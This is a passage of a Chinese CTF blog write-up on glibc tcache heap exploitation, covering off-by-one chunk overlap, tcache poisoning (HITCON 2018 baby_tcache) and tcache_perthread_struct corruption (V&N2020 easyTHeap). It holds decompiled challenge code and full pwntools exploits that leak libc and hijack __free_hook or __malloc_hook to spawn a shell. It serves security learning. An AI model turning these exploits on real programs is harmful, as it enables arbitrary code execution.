<li>此时 C 前的 prev_size 依然为 0x200（未使用到的值），A B C 的情况： <code>A (free) -&gt; B (allocated) -&gt; C (free)</code>，如果使得 B 进行溢出，则可以将已分配的 B 块包含在合并后的释放状态 unsorted bin 块中。</li>
<li>然后利用double free 来get shell</li>
</ol>
<p>但是在这个过程中需要注意 tcache 的影响。</p>
<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;easy_heap&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;easy_heap&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(size,content) :</span><br><span class="line">        sh.recvuntil(&#39;&gt; &#39;)</span><br><span class="line">        sh.sendline(str(1))</span><br><span class="line">        sh.recvuntil(&#39;&gt; &#39;)</span><br><span class="line">        sh.sendline(str(size))</span><br><span class="line">	if len(content)&gt;&#x3D;size :</span><br><span class="line">        	sh.sendlineafter(&quot;&gt;&quot;, content[:-1])</span><br><span class="line">	else :</span><br><span class="line">		sh.recvuntil(&#39;&gt; &#39;)</span><br><span class="line">		sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def delete(index) :</span><br><span class="line">        sh.recvuntil(&#39;&gt; &#39;)</span><br><span class="line">        sh.sendline(str(2))</span><br><span class="line">        sh.recvuntil(&#39;&gt; &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def show(index) :</span><br><span class="line">        sh.recvuntil(&#39;&gt; &#39;)</span><br><span class="line">        sh.sendline(str(3))</span><br><span class="line">        sh.recvuntil(&#39;&gt; &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    add(0x20,&#39;L0ne1y&#39;)</span><br><span class="line"></span><br><span class="line">for i in range(6):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(9)  #防止free的时候和top chunk合并</span><br><span class="line"></span><br><span class="line">for i in range(6,9):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"># now the heap</span><br><span class="line"># tcache-0</span><br><span class="line"># tcache-1</span><br><span class="line"># tcache-2</span><br><span class="line"># tcache-3</span><br><span class="line"># tcache-4</span><br><span class="line"># tcache-5</span><br><span class="line"># unsorted - 6</span><br><span class="line"># unsorted - 7</span><br><span class="line"># unsorted - 8</span><br><span class="line"># tcache-9</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(0x20,&#39;L0ne1y&#39;)</span><br><span class="line"></span><br><span class="line">add(0x20,&#39;aa&#39;)#7</span><br><span class="line">add(0x20,&#39;bb&#39;)#8</span><br><span class="line">add(0x20,&#39;cc&#39;)#9</span><br><span class="line"></span><br><span class="line"># now the heap </span><br><span class="line"># chunk-6</span><br><span class="line"># chunk-5</span><br><span class="line"># chunk-4</span><br><span class="line"># chunk-3</span><br><span class="line"># chunk-2</span><br><span class="line"># chunk-1</span><br><span class="line"># chunk - 7</span><br><span class="line"># chunk - 8</span><br><span class="line"># chunk - 9</span><br><span class="line"># chunk-0</span><br><span class="line"></span><br><span class="line">for i in range(6):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(8)</span><br><span class="line">delete(7)  #chunk-8和chunk-9合并，使chunk-9的prev_size&#x3D;0x200</span><br><span class="line"></span><br><span class="line">add(0xf8, str(8)*0x7) #将chunk-9的size位的P位置0</span><br><span class="line">delete(6)</span><br><span class="line">delete(9)  #合并chunk-7,8,9</span><br><span class="line"></span><br><span class="line"># now the heap</span><br><span class="line"># chunk-6   tcache</span><br><span class="line"># chunk-5   tcache</span><br><span class="line"># chunk-4   tcache</span><br><span class="line"># chunk-3   tcache</span><br><span class="line"># chunk-2   tcache</span><br><span class="line"># chunk-1   tcache</span><br><span class="line"># chunk - 7 unsorted     |</span><br><span class="line"># chunk - 8 use 0        |---&gt;free</span><br><span class="line"># chunk - 9 unsorted     |</span><br><span class="line"># chunk-0   tcache</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(0x20,&#39;L0ne1y&#39;)</span><br><span class="line"></span><br><span class="line">add(0x20,&#39;a&#39;) #8</span><br><span class="line"></span><br><span class="line">#chunk1</span><br><span class="line">#chunk2</span><br><span class="line">#chunk3</span><br><span class="line">#chunk3</span><br><span class="line">#chunk4</span><br><span class="line">#chunk5</span><br><span class="line">#chunk6</span><br><span class="line">#chunk8 </span><br><span class="line">#chunk0 unsorted and use</span><br><span class="line">#chunk7</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line"></span><br><span class="line">main_area&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;main_area : &#39; +hex(main_area))</span><br><span class="line"></span><br><span class="line">libc_base&#x3D;main_area-libc.symbols[&#39;__malloc_hook&#39;]-0x70</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line"></span><br><span class="line">#libc_base &#x3D; main_area - 0x3ebca0          vmmap -&gt; main_arena-vmmap_libc-offest</span><br><span class="line">#sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line"></span><br><span class="line">#one_gadget&#x3D;0x4f365,0x4f3c2,0x10a45c</span><br><span class="line"></span><br><span class="line">add(0x20,&#39;L0ne1y&#39;) #0 9</span><br><span class="line"></span><br><span class="line"># now the heap</span><br><span class="line"># chunk-1</span><br><span class="line"># chunk-2</span><br><span class="line"># chunk-3</span><br><span class="line"># chunk-4</span><br><span class="line"># chunk-5</span><br><span class="line"># chunk-6</span><br><span class="line"># chunk-8</span><br><span class="line"># chunk-0 chunk-9</span><br><span class="line">#</span><br><span class="line"># chunk-7</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">delete(9)</span><br><span class="line"></span><br><span class="line">free_hook&#x3D;libc_base+libc.symbols[&#39;__free_hook&#39;]</span><br><span class="line">one_gadget&#x3D;libc_base+0x4f3c2</span><br><span class="line">sh.success(&#39;free_hook : &#39; +hex(free_hook))</span><br><span class="line">sh.success(&#39;one_gadget : &#39;+hex(one_gadget))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x20,p64(free_hook))</span><br><span class="line">add(0x20,&#39;L0ne1y&#39;)</span><br><span class="line">add(0x20,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h3><p>同样，由于tcache_put函数在把chunk放入tcache Bin时没有做过多检查，我们可以在释放一个chunk将其放入tcache后，直接修改其fd指针为<strong>任意地址处</strong>，比fastbin attack更易利用的是我们无需构造fake_fastbin_size以绕过检查，便可直接将任意地址处插入到tcache Bin中。因此，常与其他漏洞利用方式，例如：off by one等结合，用来在最后劫持程序流到one_gadget程序段或system等函数处。下面通过详细分析一道例题进行进一步说明：</p>
<h3 id="HITCON-2018-PWN-baby-tcache（CTF-WIKI）"><a href="#HITCON-2018-PWN-baby-tcache（CTF-WIKI）" class="headerlink" title="HITCON 2018 PWN baby_tcache（CTF WIKI）"></a>HITCON 2018 PWN baby_tcache（CTF WIKI）</h3><h4 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下：-1"><a href="#main函数如下：-1" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; &#x2F;&#x2F; rax@2</span><br><span class="line"></span><br><span class="line">  sub_AAB();</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_BFF();</span><br><span class="line">      v3 &#x3D; read_number();</span><br><span class="line">      if ( v3 !&#x3D; 2 )</span><br><span class="line">        break;</span><br><span class="line">      delete();</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v3 &#x3D;&#x3D; 3 )</span><br><span class="line">      _exit(0);</span><br><span class="line">    if ( v3 &#x3D;&#x3D; 1 )</span><br><span class="line">      add();</span><br><span class="line">    else</span><br><span class="line">      puts(&quot;Invalid Choice&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="add函数如下：-1"><a href="#add函数如下：-1" class="headerlink" title="add函数如下："></a>add函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int add()</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v0; &#x2F;&#x2F; rax@7</span><br><span class="line">  signed int i; &#x2F;&#x2F; [sp+Ch] [bp-14h]@1</span><br><span class="line">  _BYTE *v3; &#x2F;&#x2F; [sp+10h] [bp-10h]@5</span><br><span class="line">  unsigned __int64 size; &#x2F;&#x2F; [sp+18h] [bp-8h]@3</span><br><span class="line"></span><br><span class="line">  for ( i &#x3D; 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( i &gt; 9 )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) &#x3D; puts(&quot;:(&quot;);</span><br><span class="line">      return (unsigned __int64)v0;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !ptr[i] )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Size:&quot;);</span><br><span class="line">  size &#x3D; read_number();</span><br><span class="line">  if ( size &gt; 0x2000 )</span><br><span class="line">    exit(-2);</span><br><span class="line">  v3 &#x3D; malloc(size);</span><br><span class="line">  if ( !v3 )</span><br><span class="line">    exit(-1);</span><br><span class="line">  printf(&quot;Data:&quot;);</span><br><span class="line">  sub_B88((__int64)v3, size);</span><br><span class="line">  v3[size] &#x3D; 0;                                 &#x2F;&#x2F; off by one</span><br><span class="line">  ptr[i] &#x3D; v3;</span><br><span class="line">  v0 &#x3D; size_arr;</span><br><span class="line">  size_arr[i] &#x3D; size;</span><br><span class="line">  return (unsigned __int64)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="delete函数如下："><a href="#delete函数如下：" class="headerlink" title="delete函数如下："></a>delete函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int delete()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v1; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;Index:&quot;);</span><br><span class="line">  v1 &#x3D; read_number();</span><br><span class="line">  if ( v1 &gt; 9 )</span><br><span class="line">    exit(-3);</span><br><span class="line">  if ( ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    memset(ptr[v1], 218, size_arr[v1]);</span><br><span class="line">    free(ptr[v1]);</span><br><span class="line">    ptr[v1] &#x3D; 0LL;</span><br><span class="line">    size_arr[v1] &#x3D; 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return puts(&quot;:)&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序存在<code>off-by-one</code>漏洞，但是没有show函数，没有办法泄露libc，考虑使用IO_file攻击泄露libc。</p>
<h4 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h4><ol>
<li>首先触发unlink，构造堆块重叠。</li>
<li>将unsorted chunk移动到chunk2部分，然后覆盖后三位地址为<code>IO_2_1_stdout</code>,这里覆盖后四位<code>\x60\x07</code>，所以<code>\x07</code>的0是随机的。</li>
<li>然后申请俩次chunk将<code>IO_2_1_stdout</code>申请出来，然后修改stdout的flag位为<code>0xfbad1800</code>和<code>_IO_write_base</code>的最后一个字节，接收libc地址。这里为什么是0x3e，没有懂。qaq</li>
<li>将chunk地址改为free_hook地址，写入one_gadget</li>
<li>最后free(0)来getshell</li>
</ol>
<h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;baby_tcache&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;baby_tcache&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(size,content) :</span><br><span class="line">    sh.recvuntil(&#39;: &#39;)</span><br><span class="line">    sh.sendline(&#39;1&#39;)</span><br><span class="line">    sh.recvuntil(&#39;:&#39;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&#39;:&#39;)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line">def free(index) :</span><br><span class="line">    sh.recvuntil(&#39;: &#39;)</span><br><span class="line">    sh.sendline(&#39;2&#39;)</span><br><span class="line">    sh.recvuntil(&#39;:&#39;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def exit() :</span><br><span class="line">    sh.recvuntil(&#39;: &#39;)</span><br><span class="line">    sh.sendline(&#39;3&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0X500-0X8,&#39;l0ne1y&#39;) #0</span><br><span class="line">add(0x30,&#39;L0ne1y&#39;) #1</span><br><span class="line">add(0x40,&#39;L0ne1y&#39;) #2</span><br><span class="line">add(0x50,&#39;L0ne1y&#39;) #3</span><br><span class="line">add(0x60,&#39;L0ne1y&#39;) #4</span><br><span class="line">add(0x500-0x8,&#39;L0ne1y&#39;) #5</span><br><span class="line">add(0x70,&#39;L0ne1y&#39;) #6</span><br><span class="line">free(4)</span><br><span class="line">add(0x68,&#39;a&#39;*0x60+&#39;\x60\x06&#39;) #4</span><br><span class="line">free(2)</span><br><span class="line">free(0)</span><br><span class="line">free(5)  #chunk merge</span><br><span class="line"></span><br><span class="line">add(0x530,&#39;L0ne1y&#39;) #0(0+1)</span><br><span class="line">free(4)</span><br><span class="line">add(0xa0,&#39;\x60\x07&#39;) #2(2+3)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0x40,&#39;L0ne1y&#39;) #4</span><br><span class="line">add(0x3e,p64(0xfbad1800)+p64(0)*3+&#39;\x00&#39;) #5</span><br><span class="line"></span><br><span class="line">sh.recv(8)</span><br><span class="line">IO_stdout &#x3D; u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;IO_stdout : &#39; +hex(IO_stdout))</span><br><span class="line">#0x7ffff7dd18b0-0x7ffff79e4000&#x3D;0x3ed8b0</span><br><span class="line">libc_base &#x3D; IO_stdout - 0x3ed8b0</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line"></span><br><span class="line">#one_gadget&#x3D;0x4f3c2,0x10a45c</span><br><span class="line">free_hook&#x3D;libc_base+libc.symbols[&#39;__free_hook&#39;]</span><br><span class="line">sh.success(&#39;free_hook : &#39; +hex(free_hook))</span><br><span class="line">add(0xa0,p64(free_hook)) #tcache4-&gt;free_hook</span><br><span class="line"></span><br><span class="line">add(0x60,&#39;L0ne1y&#39;)</span><br><span class="line">one_gadget&#x3D;libc_base+0x4f3c2</span><br><span class="line">sh.success(&#39;one_gadget : &#39; +hex(one_gadget))</span><br><span class="line">add(0x60,p64(one_gadget))</span><br><span class="line">free(0)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="爆破脚本："><a href="#爆破脚本：" class="headerlink" title="爆破脚本："></a>爆破脚本：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">for i in &#96;seq 1 20&#96;; do python exp.py; done;</span><br></pre></td></tr></table></figure>



<h3 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h3><p>在堆题中，我们常见的一种泄露地址的方法是泄露<code>unsortedbin</code>中chunk的<code>fd</code>和<code>bk</code>，而在严格限制chunk大小的堆题中，如果有<code>tcache</code>机制的影响，我们必须需要先将<code>tcache Bin</code>填满，才能把chunk放入<code>unsortedbin</code>中，再进行地址泄露。于是，有些堆题会对<code>malloc</code>和<code>free</code>操作的次数设定限制，这时我们可以考虑伪造<code>tcache</code>机制的主体<code>tcache_perthread_struct</code>结构体。在源代码中对其定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span>        </span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence "tcache_perthread_struct").  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];     <span class="comment">//数组counts用于存放每个bins中的chunk数量</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];   <span class="comment">//数组entries用于放置64个bins</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>tcache_perthread_struct</code>结构体首先是类型为char（一个字节）的counts数组，用于存放64个bins中的chunk数量，随后依次是对应size大小<code>0x20-0x410</code>的64个entries（8个字节），用于存放64个bins的Bin头地址。做一道例题来练习一下：</p>
<h3 id="buuoj-–-V-amp-N2020-公开赛-easyTHeap"><a href="#buuoj-–-V-amp-N2020-公开赛-easyTHeap" class="headerlink" title="buuoj – [V&amp;N2020 公开赛]easyTHeap"></a>buuoj – [V&amp;N2020 公开赛]easyTHeap</h3><h4 id="checksec检查-1"><a href="#checksec检查-1" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下：-2"><a href="#main函数如下：-2" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; &#x2F;&#x2F; [sp+Ch] [bp-4h]@2</span><br><span class="line"></span><br><span class="line">  sub_A39();</span><br><span class="line">  puts(&quot;Welcome to V&amp;N challange!&quot;);</span><br><span class="line">  puts(&quot;This&#39;s a tcache heap for you.&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_DCF();</span><br><span class="line">    v3 &#x3D; read_number();</span><br><span class="line">    if ( (unsigned int)v3 &lt;&#x3D; 5 )</span><br><span class="line">      break;</span><br><span class="line">    puts(&quot;Please input current choice.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  JUMPOUT(__CS__, (char *)dword_1090 + dword_1090[(unsigned __int64)(unsigned int)v3]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>add函数如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int add()</span><br><span class="line">&#123;</span><br><span class="line">  int result; &#x2F;&#x2F; eax@2</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line">  int v2; &#x2F;&#x2F; [sp+Ch] [bp-4h]@3</span><br><span class="line"></span><br><span class="line">  v1 &#x3D; sub_AB2();</span><br><span class="line">  if ( v1 &#x3D;&#x3D; -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; puts(&quot;Full&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;size?&quot;);</span><br><span class="line">    result &#x3D; read_number();</span><br><span class="line">    v2 &#x3D; result;</span><br><span class="line">    if ( result &gt; 0 &amp;&amp; result &lt;&#x3D; 256 )</span><br><span class="line">    &#123;</span><br><span class="line">      chunk[v1] &#x3D; malloc(result);</span><br><span class="line">      if ( !chunk[v1] )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Something Wrong!&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">      &#125;</span><br><span class="line">      size[v1] &#x3D; v2;</span><br><span class="line">      result &#x3D; puts(&quot;Done!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="edit函数如下："><a href="#edit函数如下：" class="headerlink" title="edit函数如下："></a>edit函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;idx?&quot;);</span><br><span class="line">  v1 &#x3D; read_number();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !chunk[v1] )</span><br><span class="line">    exit(0);</span><br><span class="line">  printf(&quot;content:&quot;);</span><br><span class="line">  read(0, chunk[v1], size[v1]);</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="show函数如下：-1"><a href="#show函数如下：-1" class="headerlink" title="show函数如下："></a>show函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int show()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;idx?&quot;);</span><br><span class="line">  v1 &#x3D; read_number();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !chunk[v1] )</span><br><span class="line">    exit(0);</span><br><span class="line">  puts((const char *)chunk[v1]);</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="delete函数如下：-1"><a href="#delete函数如下：-1" class="headerlink" title="delete函数如下："></a>delete函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int delete()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;idx?&quot;);</span><br><span class="line">  v1 &#x3D; read_number();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !chunk[v1] )</span><br><span class="line">    exit(0);</span><br><span class="line">  free(chunk[v1]);                              &#x2F;&#x2F; double free</span><br><span class="line">  size[v1] &#x3D; 0;</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h4><ol>
<li>首先利用double free 泄露堆地址</li>
<li>然后申请一个chunk修改fd指针为<code>tcache_perthread_struct</code>（tcache结构体被系统分配到了堆里），然后连续malloc拿到这个chunk</li>
<li>修改size数组为7，然后free一个chunk，这个chunk会被分配到unsorted bin里，我们就可以通过泄露main_arena来拿到libc_base。</li>
<li>通过修改结构体中entries数组的第一个内容，即size=0x20的chunk的tcache Bin头，再次申请0x10的chunk可以申请到指定地址的chunk，实现任意地址写</li>
<li>但是这里受次数限制我们不能写入free_hook，checksec查看可以看到<code>Full RELRO</code>保护开启，无法写入函数的got表，malloc函数的参数又是我们自己写入的，无法写入<code>&#39;/bin/sh&#39;</code>字符串，所以我们只能向<code>malloc_hook</code>中写入one_gadget地址，但是这里将可用的one_gadget全部尝试后发现均不满足条件，于是我们必须利用<code>realloc_hook</code>，通过libc中<code>realloc</code>函数前一系列的抬栈操作来满足one_gadget可以使用的条件.</li>
<li>同时<code>realloc_hook</code>与<code>malloc_hook</code>地址是连续的,因此我们劫持程序流至<code>realloc_hook</code>地址处，可以同时向两个hook地址中任意写，我们只需向<code>realloc_hook</code>中写入one_gadget，向<code>malloc_hook</code>中写入<code>realloc</code>地址加上适当的偏移（抬栈时push操作的次数不同，我们一般加上8即可），就可以在再次<code>malloc</code>时先去<code>realloc</code>函数处执行，抬栈后满足<code>one_gadget</code>的要求，再去执行<code>realloc_hook</code>中存放的<code>one_gadget</code>，进行getshell.</li>
</ol>
<h3 id="exp脚本："><a href="#exp脚本：" class="headerlink" title="exp脚本："></a>exp脚本：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;easyTheap&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;easyTheap&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(size) :</span><br><span class="line">    sh.recvuntil(&#39;: &#39;)</span><br><span class="line">    sh.sendline(&#39;1&#39;)</span><br><span class="line">    sh.recvuntil(&#39;?&#39;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def edit(index,content) :</span><br><span class="line">    sh.recvuntil(&#39;: &#39;)</span><br><span class="line">    sh.sendline(&#39;2&#39;)</span><br><span class="line">    sh.recvuntil(&#39;?&#39;)</span><br><span class="line">    sh.send(str(index))</span><br><span class="line">    sh.recvuntil(&#39;:&#39;)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line">def show(index) :</span><br><span class="line">    sh.recvuntil(&#39;: &#39;)</span><br><span class="line">    sh.sendline(&#39;3&#39;)</span><br><span class="line">    sh.recvuntil(&#39;?&#39;)</span><br><span class="line">    sh.send(str(index))</span><br><span class="line"></span><br><span class="line">def free(index) :</span><br><span class="line">    sh.recvuntil(&#39;: &#39;)</span><br><span class="line">    sh.sendline(&#39;4&#39;)</span><br><span class="line">    sh.recvuntil(&#39;?&#39;)</span><br><span class="line">    sh.send(str(index))</span><br><span class="line"></span><br><span class="line">add(0x80) #0</span><br><span class="line">add(0x10) #1</span><br><span class="line">free(0)</span><br><span class="line">free(0)</span><br><span class="line">show(0)     #-&gt;leak chunk_base</span><br><span class="line">chunk_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;chunk_addr : &#39; +hex(chunk_addr))</span><br><span class="line">chunk_base&#x3D;chunk_addr-0x250-0x10</span><br><span class="line">sh.success(&#39;chunk_base : &#39; +hex(chunk_base))</span><br><span class="line"></span><br><span class="line">add(0x80) #2</span><br><span class="line">edit(2,p64(chunk_base+0x10))</span><br><span class="line">add(0x80) #3</span><br><span class="line">add(0x80) #4  tcache_perthread_struct</span><br><span class="line">edit(4,&#39;\x00&#39;*7+&#39;\x07&#39;)</span><br><span class="line">free(3)</span><br><span class="line">show(3)</span><br><span class="line">main_arena&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;main_arena : &#39; +hex(main_arena))</span><br><span class="line">#libc_base&#x3D;main_arena-0x3ebc40</span><br><span class="line">libc_base&#x3D;main_arena-libc.symbols[&#39;__malloc_hook&#39;]-0x70</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadget&#x3D;libc_base+0x10a45c</span><br><span class="line">sh.success(&#39;one_gadget : &#39; +hex(one_gadget))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">malloc_hook&#x3D;libc_base+libc.sym[&#39;__malloc_hook&#39;]</span><br><span class="line">realloc&#x3D;libc_base+libc.sym[&#39;__libc_realloc&#39;]</span><br><span class="line">sh.success(&#39;malloc_hook : &#39; +hex(malloc_hook))</span><br><span class="line">sh.success(&#39;realloc_hook : &#39; 